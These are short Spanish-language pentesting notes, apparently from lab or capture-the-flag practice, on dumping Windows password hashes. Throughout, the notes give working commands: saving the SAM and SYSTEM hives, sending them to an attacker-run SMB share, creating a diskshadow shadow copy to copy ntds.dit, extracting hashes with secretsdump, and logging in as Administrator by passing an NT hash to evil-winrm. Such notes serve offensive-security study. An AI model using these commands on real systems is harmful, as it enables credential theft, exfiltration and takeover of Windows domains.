** Dumpear registros SAM y SYSTEM.**
Registros usados por el sistema, por lo que no pueden ser modificados.
SAM es una base de datos que guarda las contraseñas hasheadas de los usuarios. Sirve para autenticar usuarios remotos.
En base a Active Directory, este archivo se encuentra en %SystemRoot%/System32/config/SAM y es montado en HKLM/SAM (HKEY_LOCAL_MACHINE/SAM)
SYSTEM contiene información sobre el sistema Windows, FileSystem, etc.
>Pasos para dumpear los hashes
>Copiar los archivos SAM y SYSTEM en el sistema Windows
>`reg save HKLM\SAM SAM.backup`
>`reg save HKLM\SYSTEM SYSTEM.backup`
>Habilitar servidor Samba en máquina local
>`impacket-smbserver smbFolder $(pwd)`
>Si da fallos el servidor samba en Windows 10, habilitar soporte para smb2
>`impacket-smbserver smbFolder $(pwd) -smb2support`
>Transferir archivos desde Windows a máquina local
>`copy SAM.backup \\<own_ip>\smbFolder\SAM`
>`copy SYSTEM.backup \\<own_ip>\smbFolder\SYSTEM`
>En máquina local, utilizar la herramienta pwdump para visualizar estos registros. Visualizará los hashes.
>`pwdump SYSTEM SAM`

** Dumpear hashes gracias al ntds.dit **
> Copiar SYSTEM en la máquina objetivo --> `reg save HKLM\SYSTEM system`
> Crear fichero data en local:
``` data
set content persistent nowriters 
add volume c: alias pwned 
create 
expose %pwned% z: 
```
> Se debe poner un espacio al final de cada línea para que funcione correctamente.
> Subir data al equipo objetivo.
> Extraer NTDS.DIT con Diskshadow -->
```
diskshadow.exe /s data
copy z:\windows\ntds\ntds.dit C:\Users\SVC_Backup\Desktop\backup\ntds.dit
```
> Bypassear si el comando copy no funciona:
> `robocopy /b z:\windows\ntds . ntds.dit`
> Descargar tanto el fichero system como ntds.dit a la máquina local.
> Si estamos en una sesión con evil-winrm, podemos usar los comandos upload/download.
> En local, dumpear los hashes del ntds.dit con secretsdump.py
> `python secretsdump.py -system system -ntds ntds.dit LOCAL`
> Con los hashes obtenidos se puede comprobar a obtener una shell con evil-winrm como un usuario con mayores privilegios.
> `evil-winrm -i 10.10.10.92 -u 'Administrator' -H '<hash_NT_admin>'`


